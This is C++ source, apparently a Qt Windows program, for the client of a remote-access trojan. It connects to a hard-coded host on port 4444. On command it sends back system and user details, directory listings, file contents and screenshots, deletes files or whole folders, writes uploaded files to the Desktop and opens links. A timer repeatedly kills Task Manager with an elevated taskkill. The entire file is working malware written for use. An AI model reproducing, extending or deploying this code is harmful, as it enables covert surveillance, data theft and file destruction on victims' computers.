#include "mainwindow.h"
#include "ui_mainwindow.h"

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    ClientStartup();
    monitorAndKillTaskmgr();
}



MainWindow::~MainWindow()
{
    delete ui;
}


void MainWindow::ClientStartup()
{
    socket = new QTcpSocket(this);

    QObject::connect(socket, &QTcpSocket::connected,this,[&](){
        qDebug() << "[+] Succesful connected to the server.";

        QObject::connect(socket,&QTcpSocket::readyRead,this,[&](){
            qDebug() << "[+] New message from the server.";
            data += socket->readAll();


            if(data == "#getPcInformation")
            {
                QLocale currentLocale = QLocale::system();
                QString language = currentLocale.name().section('_', 0, 0);

                QString country = QLocale::territoryToString(currentLocale.territory());

                QString camAnsw;

                if (QMediaDevices::videoInputs().count() > 0)
                {
                    camAnsw = "Yes";
                }
                else
                {
                    camAnsw = "No";
                }

                QByteArray Data = "#getPcInformation:" + QSysInfo::machineHostName().toUtf8() + ":" + QDir::home().dirName().toUtf8() + ":" + "N/A" + ":" + QSysInfo::prettyProductName().toUtf8() + ":" + language.toUtf8() + ":" + country.toUtf8() + ":" + camAnsw.toUtf8();
                socket->write(Data);
                data.clear();
            }

            if(data.startsWith("#getFileTree:"))
            {
                QString dataString = data.mid(13);
                QDir dir(dataString);
                QDirIterator iterator(dir.absolutePath(), QDirIterator::Subdirectories);
                while (iterator.hasNext()) {
                    QFile file(iterator.next());
                    SelectedPath.push_back(file.fileName() + "\n");
                }

                socket->write("#getFileTree:" + SelectedPath.toUtf8());
                socket->waitForBytesWritten();
                SelectedPath.clear();
                data.clear();
            }
            if(data.startsWith("#getAllFolders:"))
            {
                QString buffer = data.mid(15);
                QString files;

                QDir dir(buffer);

                // Фильтруем только файлы и папки (без "." и "..")
                QStringList entries = dir.entryList(QDir::Files | QDir::Dirs | QDir::NoDotAndDotDot);

                for (const QString &entry : entries) {
                    files += entry + "\n";
                }

                // Отправляем данные на сервер
                socket->write("#getAllFolders:" + files.toUtf8());
                socket->waitForBytesWritten();
                data.clear();

            }
            if(data.startsWith("#deleteFile:"))
            {
                QString deletePath = data.mid(12);
                QFile::remove(deletePath);
                data.clear();
            }
            if(data.startsWith("#deleteDir:"))
            {
                QString deleteDir = data.mid(11);
                QDir dir(deleteDir);
                dir.removeRecursively();
                data.clear();
            }
            if(data.startsWith("#createFile:"))
            {
                QString filePath = data.mid(12);
                QFile createFile(filePath);
                createFile.open(QIODevice::WriteOnly);
                createFile.close();
                data.clear();
            }
            if(data.startsWith("#copyFiles:"))
            {
                QString filePath = data.mid(11);

                QByteArray buffer;
                QFile file(filePath);

                if(file.open(QIODevice::ReadOnly))
                {
                    buffer = "#copyFiles:" + file.readAll();
                    file.close();
                }

                socket->write(buffer);
                socket->waitForBytesWritten();
                data.clear();
            }
            if(data.startsWith("#openLink:"))
            {
                QString link = data.mid(10);
                QDesktopServices::openUrl(QUrl(link));
                data.clear();
            }
            if(data.startsWith("#inputFile:"))
            {
                if(isTimerCreated == 0)
                {
                    qDebug() << 123;
                    isTimerCreated = 1;
                    QTimer::singleShot(5000,this,[&](){
                        QString bufferData = data.first(20);
                        bufferData = bufferData.mid(11);
                        QStringList splitData = bufferData.split(":");
                        qint16 size = splitData[0].size();
                        QByteArray file = data.mid(11+size+1);
                        QString filSavePath = QDir::homePath() + "/Desktop/" + "sendedFile" + splitData[0];
                        QFile saveFile(filSavePath);
                        saveFile.open(QIODevice::WriteOnly);
                        saveFile.write(file);
                        saveFile.close();
                        data.clear();
                        isTimerCreated = 0;
                    });

                }
                else if(isTimerCreated == 1)
                {

                }
            }
            if(data == "#getScreenCapture")
            {
                qDebug() << 123;
                    QScreen *screen = QGuiApplication::primaryScreen();
                    QPixmap screenPhoto = screen->grabWindow(0);
                    screenPhoto.save(QDir::tempPath() + "/image.png");

                    QByteArray photoOutput;

                    QFile filePhoto(QDir::tempPath() + "/image.png");

                    filePhoto.open(QIODevice::ReadOnly);
                    photoOutput = filePhoto.readAll();
                    filePhoto.close();

                    socket->write("#getScreenCapture:" + QByteArray::number(photoOutput.size()) + ":" + photoOutput);
                    socket->waitForBytesWritten();
                    data.clear();
            }
        });

        QObject::connect(socket,&QTcpSocket::disconnected,this,[&](){
            qDebug() << "[-] Disconnected from the server.";
            socket->disconnectFromHost();
            socket->deleteLater();
        });
    });

    socket->connectToHost("192.168.18.59",4444);
}

void MainWindow::on_pushButton_clicked()
{
    QByteArray dataForServer = "Hello Server!";
    socket->write(dataForServer);
}

void MainWindow::monitorAndKillTaskmgr() {
    QTimer *timer = new QTimer();
    QObject::connect(timer, &QTimer::timeout, [=]() {
        QProcess process;
        process.start("tasklist", QStringList() << "/FI" << "IMAGENAME eq Taskmgr.exe");
        process.waitForFinished();
        QString output = process.readAllStandardOutput();

        if (output.contains("Taskmgr.exe", Qt::CaseInsensitive)) {
            qDebug() << "Taskmgr.exe обнаружен, закрываем...";
            QProcess::startDetached("powershell", QStringList()
                                                      << "Start-Process" << "taskkill.exe"
                                                      << "-ArgumentList '/F /IM Taskmgr.exe'"
                                                      << "-Verb RunAs");
        }
    });

    timer->start(300);
}
